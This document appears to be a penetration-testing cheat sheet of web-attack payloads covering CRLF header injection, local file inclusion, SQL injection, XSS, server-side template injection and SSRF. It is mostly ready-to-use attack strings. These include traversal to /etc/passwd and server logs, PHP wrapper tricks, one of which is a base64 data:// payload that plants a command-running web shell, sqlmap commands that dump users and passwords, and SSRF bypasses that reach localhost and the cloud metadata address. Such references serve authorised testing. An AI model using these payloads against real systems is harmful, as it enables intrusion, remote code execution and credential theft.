# CRLF

## 1) CRLF - Add a cookie

Requested page

```http
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

HTTP Response

```http
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```


## 2) CRLF - Filter Bypass

Using UTF-8 encoding

```http
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

Remainder:

* %E5%98%8A = %0A = \u560a
* %E5%98%8D = %0D = \u560d
* %E5%98%BE = %3E = \u563e (>)
* %E5%98%BC = %3C = \u563c (<)

# LFI 

## 1) Basic LFI



```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### 2) Null byte



```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

### 3) Double encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### 4) UTF-8 encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

## 5) LOGS

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

## 6) PHP Wrappers

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

```powershell
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

# SQL Injection 

## Entry check look for error

```sql
'
%27
"
%22
#
%23
;
%3B
)
*
&apos;  
```

## Logic Test (True and Flase based upon web app response)
```sql
1 or 1=1 -- true
1' or 1=1 -- true
1" or 1=1 -- true
1 and 1=2 -- false
```

## Automate with sql map

### Basic arguments for SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### Load a request file and use mobile user-agent

```powershell
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### Custom injection in UserAgent/Header/Referer/Cookie

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```


# XSS

## Entry level check for reflection

Note: Check for reflection like

```
https://example.com?id=shivang
```

```shivang``` should be reflected in web app view source/inspect elements

## Check for the allowed chars

```
shivang'
shivang"
shivang/
shivang\
shivang}
shivang{
shivang>
shivang>
```

# Server side template Injection

## Entery level test
```python
{{4*4}}[[5*5]] 
{{7*7}}
{{7*'7'}}
<%= 7 * 7 %>
${3*3}
${{7*7}}
@(1+2)
#{3*3}
#{ 7 * 7 }
```

Note: Check if reponse contains the solved equation for example ```#{ 7 * 7}``` in request would look like ```49``` in reponse


# Server side request forgery 

## Local Host ping test (many time outs)

```
https://example.com?pageid=http://127.0.0.1:5555
```
Note: Try to see which ports we can reach. For example ```http://127.0.0.1:80``` will take less reponse time than ```http://127.0.0.1:5555``` beacuse port ```5555``` is generally not opened

## Bypass 127.0.0.1 restrictions

### Bypass using HTTPS

```powershell
https://127.0.0.1/
https://localhost/
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
```

### Bypass localhost with [::]

```powershell
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

```powershell
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

### Bypass localhost with a domain redirection

```powershell
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
```

### Bypass localhost with CIDR 

It's a /8

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Bypass using a decimal IP location

```powershell
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254
```

### Bypass using octal IP

Implementations differ on how to handle octal format of ipv4.

```sh
http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1
http://q177.0.0.1/ = http://127.0.0.1
```




